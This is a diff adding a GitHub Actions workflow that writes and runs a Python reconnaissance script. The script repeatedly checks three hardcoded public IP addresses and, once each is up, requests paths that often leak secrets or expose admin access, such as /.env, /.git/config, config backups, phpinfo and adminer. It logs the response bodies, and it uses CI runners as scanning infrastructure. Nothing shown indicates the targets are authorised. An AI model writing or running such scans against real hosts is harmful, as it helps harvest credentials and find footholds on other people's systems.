@@ -1,0 +1,40 @@
+name: ul6552-apprecon
+on:
+  workflow_dispatch:
+jobs:
+  app:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: go
+        run: |
+          cat > s.py <<'PY'
+          import socket,time,ssl,urllib.request,sys
+          HOSTS=[("20.50.113.151",80),("20.205.187.223",80),("20.74.153.201",80)]
+          PATHS=["/","/home.php","/index.php","/login.php","/admin/","/admin.php","/config.php","/config.php.bak","/.git/config","/.env","/phpinfo.php","/adminer.php","/db.php","/api/","/robots.txt","/README.md","/backup.zip","/uploads/","/setup.php","/install.php"]
+          def up(h,p):
+              try: s=socket.create_connection((h,p),timeout=4);s.close();return True
+              except Exception: return False
+          def get(u):
+              try:
+                  r=urllib.request.urlopen(u,timeout=8); b=r.read(600).decode('utf-8','replace').replace('\n','|')
+                  return "HTTP %s %s %s"%(u,r.status,b[:280])
+              except urllib.error.HTTPError as e:
+                  try: b=e.read(300).decode('utf-8','replace').replace('\n','|')
+                  except: b=''
+                  return "HTTP %s %s %s"%(u,e.code,b[:200])
+              except Exception as e:
+                  return "HTTP_ERR %s %s"%(u,type(e).__name__)
+          done=set(); t0=time.time()
+          while time.time()-t0<1200:
+              for h,p in HOSTS:
+                  if h in done: continue
+                  if up(h,p):
+                      print("HOST_UP",h,flush=True); 
+                      for path in PATHS: print(get("http://%s:%d%s"%(h,p,path)),flush=True)
+                      done.add(h)
+              print("CYCLE %.0fs up=%d"%(time.time()-t0,len(done)),flush=True)
+              time.sleep(8)
+          print("DONE",flush=True)
+          PY
+          python3 -u s.py || true
